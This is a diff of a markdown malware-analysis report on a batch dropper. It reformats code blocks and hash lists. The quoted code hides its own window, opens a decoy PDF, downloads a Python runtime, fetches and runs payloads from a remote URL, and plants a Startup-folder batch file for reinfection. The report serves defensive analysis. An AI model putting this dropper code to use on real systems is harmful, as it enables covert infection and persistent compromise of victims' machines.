@@ -56,12 +56,12 @@ Re-launches itself hidden:
 
 `Start-Process -WindowStyle Hidden`
 
-```
+`
 if not "%~1"=="h" (
     powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'h' -WindowStyle Hidden"
     exit /b
 )
-```
+`
 ### **3.1.2 Fake PDF Open**
 
 Opens the first PDF from:
@@ -70,14 +70,14 @@ Opens the first PDF from:
 - `%USERPROFILE%\Downloads`
 
 to trick the user.
-```
+`
 for %%A in ("%USERPROFILE%\Documents\*.pdf" "%USERPROFILE%\Downloads\*.pdf") do (
     if exist "%%A" (
         start "" /B "%%A" >nul 2>&1
         goto :pdf_opened
     )
 )
-```
+`
 
 ### **3.1.3 Python Embedded Runtime Download**
 
@@ -88,14 +88,14 @@ Downloads:
 Extracts to:
 `%LOCALAPPDATA%\rtest\`
 
-```
+`
 %x1%%x2% -L -o "%zip_file%" "%py_url%" 2>nul||powershell -c "iwr '%py_url%' -OutFile '%zip_file%'" 2>nul
 if exist "%zip_file%" (
     if not exist "%py_dir%" md "%py_dir%"
     tar -xf "%zip_file%" -C "%py_dir%" 2>nul||powershell -c "Expand-Archive '%zip_file%' '%py_dir%' -f" 2>nul
     del "%zip_file%"
 )
-```
+`
 
 ### **3.1.4 Payload Download and Execution**
 
@@ -109,16 +109,15 @@ Executes:
 
 `python.exe exc.py vue.bin o.txt python.exe exc.py vew.bin x.txt python.exe exc.py we.bin a.txt`
 
-```
+`
 for %%f in (exc.py vue.bin vew.bin x.txt o.txt we.bin a.txt) do (
     %x1%%x2% -L -o "%py_dir%\%%f" "%custom_url%/%%f" 2>nul||powershell -c "iwr '%custom_url%/%%f' -OutFile '%py_dir%\%%f'" 2>nul
 )
-
 cd /d "%py_dir%"
 python.exe exc.py vue.bin o.txt
 python.exe exc.py vew.bin x.txt
 python.exe exc.py we.bin a.txt
-```
+`
 
 ![[Pasted image 20251201213559.png]]
 
@@ -132,14 +131,14 @@ Dropped into Windows startup folder:
 
 Re-runs the injector on every logon → continual reinfection.
 
-```
+`
 set "s1=star"
 set "s2=tup"
 set "s3=pdfr"
 set "s4=ead"
 set "startup_dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 %x1%%x2% -L -o "%startup_dir%\%s3%%s4%.bat" "%custom_url%/%s3%%s4%.bat" 2>nul||powershell -c "iwr '%custom_url%/%s3%%s4%.bat' -OutFile '%startup_dir%/%s3%%s4%.bat'" 2>nul
-```
+`
 
 ---
 
@@ -292,9 +291,9 @@ These connections occurred **after** the shellcode executed inside `explorer.exe
 
 **SHA256:**
 
-`vue: 7B9EDBD936BF837C6BF383C3A05C7D80A279498CF25CC40A5D8D78F86B61B36F` 
-`vew: 6ECB48B7550CF4ACCC6BD50812D7212ED6A14C305A46447112A43409394EC12B` 
-`we:  3745180E25A1298BEED49BF557A29C649B23F109693451382EE73F50CCDD4907`
+- vue: `7B9EDBD936BF837C6BF383C3A05C7D80A279498CF25CC40A5D8D78F86B61B36F` 
+- vew: `6ECB48B7550CF4ACCC6BD50812D7212ED6A14C305A46447112A43409394EC12B` 
+- we:  `3745180E25A1298BEED49BF557A29C649B23F109693451382EE73F50CCDD4907`
 
 ---
 
